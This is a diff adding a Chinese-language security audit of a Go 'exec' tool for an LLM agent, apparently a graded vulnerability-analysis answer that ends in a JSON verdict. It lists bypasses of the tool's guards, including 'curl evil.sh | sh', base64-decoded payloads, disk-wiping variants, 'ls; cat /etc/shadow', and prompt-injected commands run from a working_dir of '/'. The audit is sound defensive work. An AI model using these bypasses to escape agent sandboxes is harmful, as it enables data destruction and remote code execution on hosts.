@@ -1,0 +1,71 @@
+# 全文逐函数安全分析
+
+## 1. 文件结构与入口点枚举
+
+本文件为 LLM Agent 的 `exec` 工具实现，全文共约 190 行，包含以下函数/入口：
+
+- **第 10–16 行**：`ExecTool` 结构体定义（workingDir、timeout、denyPatterns、allowPatterns、restrictToWorkspace）
+- **第 18–31 行**：`NewExecTool` 构造器，初始化黑名单正则
+- **第 33–35 行**：`Name()` —— 工具名 `exec`
+- **第 37–39 行**：`Description()`
+- **第 41–55 行**：`Parameters()` —— 声明两个参数：`command`（必填字符串）与 `working_dir`（可选字符串）。这是**第一入口点**：两者均来自 LLM 输出，属不可信输入
+- **第 57–124 行**：`Execute(ctx, args)` —— 核心执行路径
+- **第 126–168 行**：`guardCommand(command, cwd)` —— 唯一的防御层
+- **第 170–172 行**：`SetTimeout`
+- **第 174–176 行**：`SetRestrictToWorkspace`
+- **第 178–189 行**：`SetAllowPatterns`
+
+## 2. Execute 函数数据流分析（第 57–124 行）
+
+**Source 1 — 第 59 行**：`args["command"].(string)` 取出命令字符串。该参数由 LLM 生成，可能受提示注入影响，视为不可信。
+
+**Source 2 — 第 63 行**：`args["working_dir"]` 直接覆盖 `cwd = wd`，无任何校验、无白名单目录限制。即使 `restrictToWorkspace=true`，攻击者也可将工作目录设为 `/` 或任意绝对路径——guard 中第 143 行的 `filepath.Abs(cwd)` 会以这个被污染的 cwd 为基准做相对判断，基准本身已被攻陷。
+
+**Sink — 第 92/94 行**：`exec.CommandContext(cmdCtx, "sh", "-c", command)` / `"powershell", "-NoProfile", "-NonInteractive", "-Command", command`。命令字符串整体交给 shell 解释，是典型的 OS 命令注入 sink（CWE-78）。
+
+中间唯一防御是第 70 行 `t.guardCommand(command, cwd)`，下面验证其有效性。
+
+## 3. guardCommand 防御逐条验证（第 126–168 行）
+
+### 3.1 黑名单（第 128–135 行）——按题目要求视为可绕过
+
+- `\brm\s+-[rf]{1,2}\b`：绕过方式包括 `rm -r -f`（分开写不匹配 `{1,2}` 连续形式？实际 `-r -f` 中 `-r` 单独匹配 `[rf]{1,2}`，但可用 `rm --recursive`、`find . -delete`、`python -c 'import shutil; shutil.rmtree(...)'`）
+- `(format|mkfs|diskpart)\b\s`：要求后跟空白，`mkfs.ext4 /dev/sda1` 不带空格直接绕过；`dd if=` 可写 `dd if=/dev/zero of=...` 换成 `dd of=... if=...` 参数顺序颠倒即绕过
+- `>\s*/dev/sd[a-z]`：可用 `tee`、`cp`、`shred`、`cat > /dev/sda1`（`>` 后换行或变量拼接 `$'\x2f'dev/sda`）
+- fork bomb 正则 `:\(\)\s*\{.*\};\s*:` 仅匹配单行紧凑写法，多行/加空格变体即可绕过
+- 黑名单本质是 deny-list，无法覆盖 shell 元能力：`curl evil.sh | sh`、`bash -c`、base64 解码执行、环境变量拼接等全部放行
+
+结论：黑名单过滤无效（符合“黑名单/正则视为可绕过”的判定标准）。
+
+### 3.2 allowlist（第 137–148 行）
+
+仅当调用方显式调用 `SetAllowPatterns` 才生效；默认 `allowPatterns == nil`（第 29 行），默认部署下此分支完全不执行。且 allowlist 与 denylist 是对同一字符串的正则匹配，LLM 构造的命令只要字面匹配 allow 规则即可携带任意语义（如 allow `^ls` 则 `ls; cat /etc/shadow` 匹配成功）。
+
+### 3.3 restrictToWorkspace 路径检查（第 150–166 行）——核心缺陷
+
+- 第 151–154 行：仅检查字符串中是否出现字面 `..\` 或 `../`。绕过：使用符号链接、`$HOME`、`~` 展开、URL 编码后的二次解释、`cd / && rm file`（命令内 cd 后的相对路径）、或直接引用不含点号的绝对路径。
+- 第 156–158 行：`filepath.Abs(cwd)` 失败时**静默返回空串放行**（fail-open），违反安全默认原则。
+- 第 160 行：`pathPattern := regexp.MustCompile(...)`,用正则从命令文本里“抽取路径”。这只能捕获形如绝对路径的字面 token；`cd /tmp; touch x`、管道重定向到变量、`$(pwd)/..` 等均提取不到。
+- 第 163–167 行：`filepath.Rel(cwdPath, p)` 出错时 `continue` 放行；且由于 Source 2（第 63 行）允许 LLM 自选 `working_dir`，`cwdPath` 本身可被设为 `/`，此时任何路径 `rel` 都不以 `..` 开头，整个 workspace 限制被完全架空。
+
+### 3.4 第二入口与替代通道
+
+- **第二入口**：`working_dir`（第 63 行）独立于 command 进入 sink（第 96 行 `cmd.Dir = cwd`），可指向敏感目录（如 `~/.ssh`）执行命令，绕过所有针对 command 文本的检查。
+- **替代通道**：`SetRestrictToWorkspace`（第 174 行）与 `SetTimeout`（第 170 行）为公开 setter，若配置来源可控可在运行时关闭限制；`SetAllowPatterns`（第 178 行）接受任意用户正则，恶意模式如 `.*` 等于关闭 allowlist。
+- 无 shell 转义、无最小权限进程降权、无 seccomp/沙箱、输出回传 LLM（第 100–104 行）形成信息泄露回环（可读 `/etc/passwd`、密钥文件并回显给模型）。
+
+## 4. 结论
+
+source（第 59 行 LLM 提供的 command，及第 63 行 working_dir）→ 经无效的黑名单/文本级路径检查（第 128–166 行）→ sink（第 92/94 行 `sh -c` / powershell 执行）。黑名单可绕过 + fail-open + working_dir 自选架空路径限制，构成真实可利用的 CWE-78（伴随 CWE-22 路径限制绕过）。风险等级：高（在 Agent 场景下等于授予 LLM 主机任意命令执行权）。
+
+```json
+{
+  "has_vulnerability": true,
+  "vulnerability_type": "CWE-78 (OS Command Injection) with CWE-22 (path restriction bypass)",
+  "risk_level": "high",
+  "source": "line 59: args['command'] and line 63: args['working_dir'] both come from LLM-controlled tool arguments",
+  "sink": "line 92-94: exec.CommandContext(cmdCtx, 'sh', '-c', command) or powershell -Command command",
+  "explanation": "The only defense is guardCommand at line 70. Its deny regexes (lines 128-135) are trivially bypassed via equivalent commands such as find -delete, mkfs.ext4 without space, dd argument reordering, tee, base64-decoded payloads or curl|sh; the path check (lines 150-166) is text-level: it misses symlinks, variable expansion and in-command cd, silently fails open on Abs/Rel errors (lines 157, 165), and is fully neutralized because the attacker can set working_dir to '/' via line 63 so filepath.Rel never yields a '..' prefix. The allowlist branch is inactive by default since allowPatterns is nil at line 29. Thus untrusted LLM input flows directly into shell execution.",
+  "fix_suggestion": "Do not pass raw strings to a shell: replace lines 92-94 with exec.CommandContext using an argv slice parsed from an explicit schema, run under a sandbox/container with dropped privileges and filesystem isolation, validate working_dir against a fixed allowlisted absolute directory resolved with filepath.EvalSymlinks before assigning cmd.Dir at line 96, replace the deny regexes with a default-deny policy, and make all validation failures fail closed instead of returning empty string at lines 157 and 165."
+}
+```
